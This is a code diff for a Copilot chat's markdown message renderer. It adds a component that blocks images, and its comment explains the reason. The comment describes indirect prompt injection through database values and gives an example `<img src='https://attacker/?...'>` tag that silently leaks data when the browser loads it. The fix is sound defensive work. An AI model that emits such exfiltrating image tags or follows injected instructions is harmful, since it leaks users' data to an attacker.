@@ -19,12 +19,21 @@ export interface Props {
   onMessageRendered?: () => void
 }
 
+// Renders nothing for both markdown image syntax (`![]()`) and any raw
+// `<img>` MarkdownRenderer's default `img` handler would otherwise emit.
+const NoImage = () => null
+
 /**
- * Copilot answers are plain markdown (text, tables, code, links) that may be
- * influenced by untrusted data (e.g. indirect prompt injection via values
- * stored in the database). MarkdownRenderer never parses raw HTML into live
- * elements (no rehype-raw), so tags like `<img src="https://attacker/?...">`
- * render as literal text instead of firing an outbound request. See
+ * Copilot answers are plain markdown (text, tables, code, links). They never
+ * contain images or embedded media, and message content can be influenced by
+ * untrusted data (e.g. indirect prompt injection via values stored in the
+ * database), so images must never render: an `<img src="https://attacker/?...">`
+ * (from raw HTML or from markdown image syntax) would otherwise fire an
+ * outbound request as soon as the browser loads it, silently exfiltrating
+ * data. Raw HTML is already inert because MarkdownRenderer never parses it
+ * into live elements (no rehype-raw); the `Image` leaf below closes the
+ * remaining gap for markdown-syntax images, which MarkdownRenderer renders as
+ * a live `<img>` by default when no `Image` leaf is supplied. See
  * RED-194228 / VDP-4596.
  */
 const MarkdownMessage = (props: Props) => {
@@ -50,6 +59,7 @@ const MarkdownMessage = (props: Props) => {
         CodeBlock: ChatCodeBlock,
         CloudLink,
         ExternalLink: ChatExternalLink,
+        Image: NoImage,
       }}
     >
       {children}
